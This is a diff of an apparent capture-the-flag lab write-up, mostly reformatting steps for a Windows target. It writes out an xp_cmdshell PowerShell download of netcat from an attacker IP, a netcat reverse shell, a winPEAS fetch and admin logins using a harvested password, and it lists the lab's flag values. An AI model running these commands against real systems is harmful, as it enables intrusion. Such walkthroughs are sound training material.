@@ -83,12 +83,13 @@
     # powershell -c Invoke-WebRequest: run PowerShe;; to download a file from a URL
     # -Uri http://10.10.14.60/nc64.exe: attacker IP
     # -OutFile: Save the downloaded file to the target machine.
-    xp_cmdshell "powershell -c Invoke-WebRequest -Uri http://10.10.14.60/nc64.exe -OutFile C:\\Users\\sql_svc\\Downloads\\nc64.exe"
+    xp_cmdshell "powershell -c Invoke-WebRequest -Uri http://10.10.14.60/nc64.exe -OutFile    C:\\Users\\sql_svc\\Downloads\\nc64.exe"
 
     # -e cmd.exe : Tells Netcat to spawn a command prompt and send its I/O through the connection
     # 10.10.14.60.443: attacker IP
-xp_cmdshell "C:\\Users\\sql_svc\\Downloads\\nc64.exe -e cmd.exe 10.10.14.60 443"
-   ```
+
+    xp_cmdshell "C:\\Users\\sql_svc\\Downloads\\nc64.exe -e cmd.exe 10.10.14.60 443"
+    ```
 
 8. Receive reverse shell and read the user flag:
 
@@ -97,9 +98,9 @@ xp_cmdshell "C:\\Users\\sql_svc\\Downloads\\nc64.exe -e cmd.exe 10.10.14.60 443"
    type user.txt
    ```
 
-In this part we can get the user flag: 3e7b102e78218e935bf3f4951fec21a3
+   In this part we can get the user flag: 3e7b102e78218e935bf3f4951fec21a3
 
-![scan port](./image/Task5_get_user.jpg)
+   ![scan port](./image/Task5_get_user.jpg)
 
 
 9. Now, we need to get the root flag:
@@ -107,8 +108,9 @@ In this part we can get the user flag: 3e7b102e78218e935bf3f4951fec21a3
    Use WinPEAS to enumerate for privillege escalation:
 
     ```bash
-   Invoke-WebRequest -Uri http://10.10.14.60/winPEASx64.exe -OutFile winPEASx64.exe
-.\winPEASx64.exe
+    
+   Invoke-WebRequest -Uri http://10.10.14.60/winPEASx64.exe -OutFile winPEASx64.exe .\winPEASx64.exe
+    
    ```
 
    It shows the PowerShell history path.
@@ -119,34 +121,44 @@ In this part we can get the user flag: 3e7b102e78218e935bf3f4951fec21a3
     type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
     ```
 
-   We got the password,
+      We got the password,
    
-   $secpasswd = ConvertTo-SecureString 'MEGACORP_4dm1n!!' -AsPlainText -Force
+      ```bash
+      
+      $secpasswd = ConvertTo-SecureString 'MEGACORP_4dm1n!!' -AsPlainText -Force
+      
+      ```
    
 11.  Login as Administrator
 
-     We use impacket pasexec.py:
+        We use impacket pasexec.py:
 
-     ```bash
-     python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.129.10.155
-     ```
+        ```bash
+     
+        python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.129.10.155
+        
+        ```
 
      or use the Evil-WinRm:
 
-    ```bash
-    evil-winrm -i 10.129.10.155 -u Administrator -p 'MEGACORP_4dm1n!!'
-    ```
+       ```bash
+       
+       evil-winrm -i 10.129.10.155 -u Administrator -p 'MEGACORP_4dm1n!!'
+       
+       ```
 
-    After this, we can read the root flag:
+       After this, we can read the root flag:
 
-    ```bash
-    cd C:\Users\Administrator\Desktop
-    type root.txt
-    ```
+       ```bash
+    
+       cd C:\Users\Administrator\Desktop
+       type root.txt
+        
+       ```
+    
+       get the root flag: b91ccec3305e98240082d4474b848528.
 
-    Get the root flag: b91ccec3305e98240082d4474b848528.
-
-   ![scan port](./image/Task5_get_root.jpg)
+      ![scan port](./image/Task5_get_root.jpg)
 
 ## Task 2
 
@@ -168,6 +180,8 @@ In this part we can get the user flag: 3e7b102e78218e935bf3f4951fec21a3
 2. Therefore, i tried the login page by using http://10.129.95.191/cdn-cgi/login/.
 
    Can log in the page successfully.
+
+   
 
    
    
